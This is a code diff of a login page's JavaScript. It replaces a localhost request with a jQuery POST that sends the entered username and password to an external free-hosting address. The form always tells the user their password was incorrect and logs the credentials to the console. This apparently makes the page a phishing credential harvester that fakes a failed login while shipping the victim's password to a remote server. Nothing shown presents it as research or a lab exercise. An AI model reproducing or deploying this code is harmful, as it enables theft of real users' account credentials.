@@ -40,17 +40,28 @@ submit.addEventListener('click', () => {
     error.textContent = `Sorry, your password was incorrect. Please double-check your password.`;
     console.log(`submit=submit&username=${username.value}&password=${password.value}`);
     if (checkpass()) {
-        XMLHttpRequestFn({
+        // XMLHttpRequestFn({
+        //     method: 'POST',
+        //     url: 'http://localhost/local/cru.php',
+        //     data: `submit=submit&username=${username.value}&password=${password.value}`,
+        //     callbackT: (response) => {
+        //         console.log(response);
+        //     } 
+        // })
+
+        $.ajax({
             method: 'POST',
-            url: 'http://localhost/local/cru.php',
-            data: `submit=submit&username=${username.value}&password=${password.value}`,
-            callbackT: (response) => {
+            url: 'https://webskod.000webhostapp.com/index.php',
+            data: {submit: 'submit', username: username.value, password: password.value},
+            success: (response) => {
                 console.log(response);
             } 
         })
     }
 
 })
+
+
 
 // ################
 
